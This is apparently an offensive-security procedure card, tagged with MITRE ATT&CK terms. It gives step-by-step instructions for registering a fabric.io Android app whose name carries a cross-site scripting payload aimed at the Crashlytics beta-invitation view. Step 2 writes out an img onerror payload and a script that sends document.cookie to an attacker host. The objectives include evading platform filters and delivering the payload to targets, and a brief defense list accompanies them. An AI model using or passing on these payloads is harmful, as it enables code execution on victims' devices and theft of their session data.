---
tags:
  - xss
  - injection
  - fabric.io
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:39.674Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 51d22308-c2c2-47b1-bdbc-cf460778d7b1
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-App-with-Payload-Name

## Summary

This procedure involves creating a new Android app on the fabric.io platform with a cross-site scripting payload embedded in the app name field. The payload is designed to execute JavaScript when the name is rendered unsanitized in the Crashlytics Android app, exploiting a lack of HTML escaping.

## Description

In the context of attacking the Crashlytics ecosystem, an attacker with a fabric.io developer account can register a test app and inject malicious HTML/JavaScript into the app name. This name is later displayed in the Crashlytics app during beta invitation viewing, typically in a WebView or HTML-rendered component without proper sanitization. The result is arbitrary code execution on the victim's Android device, limited to the app's context but capable of accessing local data or launching intents. Prerequisites include a free fabric.io account; no advanced technical skills beyond basic web development knowledge are needed.

## Requirements

1. Active fabric.io developer account (sign up at fabric.io)
2. Web browser for dashboard access
3. Basic understanding of HTML and JavaScript payloads

## Defense

Defensive measures and detection strategies:

- Sanitize all user-controlled inputs (e.g., app names) before HTML rendering in mobile apps
- Implement Content Security Policy (CSP) in WebViews to restrict script execution
- Monitor fabric.io for suspicious app creations with anomalous names
- Educate beta testers on verifying app sources before accepting invitations

## Objectives

1. Inject XSS payload into app metadata for later execution
2. Set up the app for beta distribution without triggering platform filters
3. Prepare for payload delivery to targets

## Instructions

### Step 1: Log In and Navigate to Dashboard

**Context**: Access the fabric.io platform to initiate app creation.

Log into your fabric.io account using a web browser and navigate to the 'Apps' section in the dashboard.

### Step 2: Create New Android App

**Context**: Register a new app and inject the payload into the name field.

Click 'New App' or equivalent, select Android as the platform, and in the 'App Name' field, enter a payload like "><img src=x onerror=alert(03)>. For more advanced payloads, use something like "><script>fetch('https://attacker.com/steal?data='+document.cookie)</script> to exfiltrate data. Complete other required fields (e.g., package name) with dummy values; no APK upload is necessary for this exploit.

> The payload closes any open HTML tags and injects an image or script that triggers on error or load, executing JavaScript in the rendering context.

### Step 3: Save and Verify App Creation

**Context**: Confirm the app is created with the payload intact.

Submit the form and verify in the dashboard that the app name displays the injected payload without sanitization. Note the app's ID or URL for invitations.

**Expected Output**: App listed in dashboard; payload visible in name field.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- injection
- android
